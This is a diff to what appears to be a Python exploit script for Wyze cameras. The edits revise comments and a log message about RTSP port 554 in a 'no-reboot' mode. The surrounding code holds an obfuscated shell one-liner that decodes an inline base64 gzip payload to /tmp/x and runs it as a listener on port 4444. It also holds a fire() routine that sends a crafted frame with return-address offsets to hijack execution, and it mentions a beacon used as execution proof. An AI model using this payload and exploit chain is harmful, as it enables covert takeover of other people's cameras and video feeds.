@@ -76,8 +76,13 @@ def build_command(user: str, realm: str, pwd: str) -> str:
 #      payload decoded from the inline gzip lands in /tmp/x and listens on 4444
 #      until the NEXT reboot. Durable for this boot only, by design: nothing is
 #      written to flash, so the chain is fully reversible by rebooting.
-# No `reboot` anywhere. RTSP itself needs no daemon restart: rtsp-enable.md
-# proved 554 can bind without the SDK encoder path when the config exists.
+# No `reboot` anywhere. CAVEAT (rtsp-enable.md root-cause section): the RTSP server
+# thread aborts before accept() unless wyze_rtsp_sdk_init_v2 populated the encoder
+# globals at boot (video channel count + fps). A config write alone does NOT make
+# 554 serve — the durable value of the config write is that ANY LATER boot serves it.
+# The in-session 554 poll is therefore opportunistic: it only succeeds on a unit
+# whose encoder path is already live. The beacon (fss-ran) is the reliable execution
+# proof; treat "554 up in-session" as a bonus, never as the success criterion.
 SHELL_ONE_LINER = (
     "echo H4sIAAAAAAAC/41TMUvDQBh9uSZtRMG2OIg4BEyhOiQOTlLxOigWVAoKLi4p1lqQWpsruLWDg7P/wKGTuPcXOPcf6Ojg0EVwq98llzaWCj54d/m+792Xu8tLZ+9wX9M0RGAwIaMhOLZo7jIglUZzCxZ05JFCEgmg2adanzSSy/QsqRPNsE1zQMOAaoOpuuTkbTzgOyUkDZlKh/Ugl+EByxRLJlU9hMVo2wamIBKJ6RSsRx47n24zGDZ1s8/SzF6gXK7LaRdzhdXseo7OT7V8L3Nuki7f02G9mMScBZbLW1qa1pWidZTTqddxLKZT2AdR/MApZwW5t8VIQ/ueilks5tAL75l7m8MoDDM9mpOFpeyr/Ryrf6j694x6h873pJ4l3Eq94fpXcG+BW4R3KvGp7laiXDw92JHCbdenEXqW4y8UF2moNdrQUvJrGnD8K1+0hFeBc1QqnzhepX557dV8OK1qrd64vIEjqncCzoUnPDi01PGEaNUrbVH18W/MEzfIV2zsu9BTEUwVr4Q+CXSh/37rdBWvKR8mldeHwTxBZLN1pUuou5O+LM/QucSv0egmym+ymFVjno96jf8A0u3O0P0AQ+VsJZgDAAA=|/bin/base64 -d|/bin/gunzip>/tmp/x;/bin/chmod +x /tmp/x;/tmp/x&"
 )
@@ -341,11 +346,14 @@ def fire(ip: str, uid: str, enr: str, mac: str, a: argparse.Namespace,
     print(f"{ip}: frame sent {len(frame)}B ra={a.ra:#x} ra_off={a.ra_off} "
           f"cmd_off={a.cmd_off} declared={a.declared}")
     if a.no_reboot:
-        # no reboot happens: exec_shell_sync runs the chain synchronously; RTSP
-        # binds from the config write within seconds, so poll a short window and
-        # keep the session ALIVE (the frame budget is per-boot — do not waste it).
+        # no reboot happens: exec_shell_sync runs the chain synchronously. CAVEAT:
+        # 554 serving requires the encoder globals wyze_rtsp_sdk_init_v2 sets at
+        # boot (rtsp-enable.md root cause) — a config write alone does not make the
+        # server thread reach accept(). The poll is opportunistic; the beacon in
+        # the :8080 log is the reliable execution proof. Keep the session ALIVE
+        # (the frame budget is per-boot — do not waste it).
         up = poll_554(ip, min(a.poll_secs, 30))
-        print(f"{ip}: 554 listening (no-reboot): {up}")
+        print(f"{ip}: 554 listening (no-reboot, opportunistic): {up}")
         if not up:
             # config write may still have landed; verify config presence via a
             # second hijack only if the budget allows — record, don't retry blind.
